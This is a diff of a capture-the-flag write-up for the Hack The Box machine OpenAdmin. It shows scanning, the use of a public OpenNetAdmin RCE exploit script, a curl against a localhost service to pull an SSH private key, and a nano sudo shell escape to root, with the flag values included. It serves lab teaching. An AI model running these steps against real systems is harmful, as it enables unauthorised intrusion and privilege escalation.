@@ -33,7 +33,7 @@ Nulla aptent sociosqu vivamus pellentesque donec senectus venenatis, elementum m
 
 ## Nmap
 
-```shell
+```console
 $ sudo nmap -sC -sV -oA nmap 10.10.10.171
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 18:28 CEST
 Nmap scan report for 10.10.10.171
@@ -58,7 +58,7 @@ We notice that port `22/tcp` and port `80/tcp` are open.
 
 ## Gobuster
 
-```shell
+```console
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/
 ===============================================================
 Gobuster v3.0.1
@@ -130,8 +130,8 @@ $ chmod +x 47691.sh
 At last we start the shell script and point it to the target url.
 And a shell is popping up.
 
-```shell
-./47691.sh http://10.10.10.171/ona/
+```console
+$ ./47691.sh http://10.10.10.171/ona/
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -325,7 +325,7 @@ Bingo! Now that we are successfully escalated to jimmy, let's check out the
 internal directory.
 
 In the `main.php` file we get a hint that the file runs on an webserver and
-is able to cat out the ssh private key of joanna.
+is able to cat out the **ssh private key** of joanna.
 
 ```console
 jimmy@openadmin:/var/www/internal$ cat main.php 
@@ -342,7 +342,7 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 ```
 
 In our nmap we couldn't find any other port or webserver so let's see if there is something
-listening on `127.0.0.1` aka the localhost.
+listening on `127.0.0.1` aka the **localhost**.
 
 ```console
 jimmy@openadmin:~$ ss -tulpn
@@ -356,8 +356,8 @@ tcp    LISTEN   0        128                     *:80                   *:*
 tcp    LISTEN   0        128                  [::]:22                [::]:*
 ```
 
-The interesting port here is the high port `52846` which we immediately throw a curl at
-to see if we can get the private key.
+The interesting port here is the high port `TCP/52846` which we immediately throw a curl at
+to see if we can get the **private key**.
 
 ```console
 jimmy@openadmin:/var/www$ curl 127.0.0.1:52846/main.php
@@ -464,7 +464,6 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
 ```
 
-
 # user.txt
 
 ```console
@@ -474,11 +473,67 @@ c9b2cf07d40807e62af62660f0c81b5f
 
 # The way to root
 
+We start with having a look at the group memberships.
 
+```console
+joanna@openadmin:~$ id
+uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
+```
 
+So joanna doens't seems to have any special memberships so far. Let's try if joanna has an entry in the **sudors** file.
 
+```console
+joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+```
+
+Well that's the case. The user joanna is able to execute the nano binary with root privileges in `/opt/priv` which means
+that we can create a file in there.
+
+Let's have a look at **gtfobins** if we can find some useful information to execute a root shell.
+
+> https://gtfobins.github.io/gtfobins/nano/
+
+Now we try to get this running.
+
+```console
+joanna@openadmin:~$ sudo /bin/nano /opt/priv
+```
+
+We press **Ctrl+r** and then **Ctrl+x**.
+
+```console
+Command to execute:
+^G Get Help						^X Read File
+^C Cancel						M-F New Buffer
+```
+
+Then we enter `reset; sh 1>&0 2>&0` and press enter to execute it.
+
+As we can see we spawned a shell out of nano.
+
+```console
+Command to execute: reset; sh 1>&0 2>&0#
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+# root.txt
+
+All what we have to do is to grab the root flag and that's it!
+
+```console
+# cat /root/root.txt
+2f907ed450b361b2c2bf4e8795d5b561
+```
+
+THE END
 
 # Resources
 
 <https://www.exploit-db.com/exploits/47691>
+<https://gtfobins.github.io/>
